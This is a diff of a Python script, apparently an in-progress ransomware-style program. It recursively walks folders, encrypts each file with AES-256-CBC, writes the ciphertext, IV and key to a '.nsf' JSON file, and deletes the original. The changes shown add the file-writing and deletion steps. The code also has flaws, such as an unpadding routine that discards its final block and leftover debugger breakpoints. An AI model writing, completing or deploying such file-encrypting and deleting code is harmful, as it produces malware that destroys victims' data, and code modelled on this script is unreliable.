@@ -20,9 +20,7 @@ def MyEncrypt(file, key):
     #Generate cipher text
     cipher = createCipher(IV, key)
     encryptor = cipher.encryptor()
-    #pad file to meet requirements
-    #padded_file = padFile(file)
-    cipher_text = encryptor.update(padded_file) + encryptor.finalize()
+    cipher_text = encryptor.update(file) + encryptor.finalize()
         
     return cipher_text, IV
 
@@ -33,19 +31,22 @@ def MyEncrypt(file, key):
 def MyfileEncrypt(file_path):
     #Generates 32-bit key
     key = generateRandom(const.ENC_DEC_KEY_LENGTH)
-    # Can/Should the file be padded before encoding it?
-    #padded_file = padFile(file)
-    #Generate the encoded version of the file
-    file = encodeFile(file_path)
+    #Retrieve a padded file from the specified file_path variable
+    file = get_padded_file(file_path)
     #Encrypt the above file
     cipher_text, IV = MyEncrypt(file, key)
+    #Encode the cipher textex
+    encoded_cipher_text = encode_text(cipher_text)
+    encoded_IV = encode_text(IV)
+    encoded_key = encode_text(key)
     #Extract the file enxtension
     split_string = file_path.split('.')
+    file_name = split_string[0]
     file_extension = '.' + split_string[len(split_string) - 1]
-    
+
     #Return the generated cipher text, 16-bit IV, 32-bit Key, and the
     #File extension
-    return cipher_text, IV, key, file_extension
+    return encoded_cipher_text, encoded_IV, encoded_key, file_extension, file_name
 
 ##########################################################
 # Given an AES-256 Cipher Text,key, and iv; a cipher text 
@@ -62,11 +63,18 @@ def MyDecrypt(cipher_text, key, iv):
 def MyfileDecrypt():
     pass
 
-def encodeFile(file_path):
-    encoded_string = None
+def get_padded_file(file_path): 
+    read_file = None
+    #Read the file from the file path
     with open(file_path, mode='rb') as file:
-        encoded_string = base64.b64encode(file.read())
-    return encoded_string
+        read_file = file.read()
+    #Pad the file
+    padded_file = padFile(read_file)
+    
+    return padded_file
+
+def encode_text(string):
+    return base64.b64encode(string)
 
 ##########################################################
 # A given file is padded into 128-bit blocks so that it 
@@ -83,16 +91,7 @@ def unpadFile(file):
      data = unpadder.update(file)
      data + unpadder.finalize()
      return data
-
-
-def stringify(item_list):
-    #Holds all of the decoded items
-    stringified_items = list()
     
-    for i in range(len(item_list)):
-        stringified_items.append(str(item_list[i]));
-    
-    return stringified_items[0], stringified_items[1], stringified_items[2]
 
 def generateRandom(key_length):
     #Idk if this is the right way to generate it
@@ -109,7 +108,14 @@ def createCipher(iv, key):
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
     return cipher
         
-
+def stringify(item_list):
+    #Holds all of the decoded items
+    stringified_items = list()
+    
+    for i in range(len(item_list)):
+        stringified_items.append(str(item_list[i]));
+    
+    return stringified_items[0], stringified_items[1], stringified_items[2]
 
 if __name__ == '__main__':
     #Retrieves the path to the current location of this file
@@ -127,18 +133,21 @@ if __name__ == '__main__':
         if(curr_folder == '') :
             files.remove(skip_file_list[0])
             files.remove(skip_file_list[1])
-            files.remove(skip_file_list[2])
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
-            file_path = curr_path + curr_folder + "/" +files[i]
+            file_path = curr_path + curr_folder + "/" + files[i]
             #Generate cipher text, IV, Key, and file extension
-            pdb.set_trace()
-            cipher_text, IV, key, ext = MyfileEncrypt(file_path);
-            cipher_text, IV, key = stringify(list([cipher_text, IV, key]))
+            encoded_cipher, encoded_IV, encoded_key, ext, file = MyfileEncrypt(file_path)
+            #Stringify the following list
+            cipher, IV, key = stringify([encoded_cipher, encoded_IV, encoded_key])
             #Generate map
-            item_map = {'c' : cipher_text, 'IV' : IV, 'key' : key, 'ext' : ext}
+            item_map = {'c' : cipher, 'IV' : IV, 'key' : key, 'ext' : ext}
             #Generate Json
             dump = json.dumps(item_map)
+            f = open(file+ ".nsf", "w+")
+            f.write(dump)
+            pdb.set_trace()
+            os.remove(file_path)
             
             
             
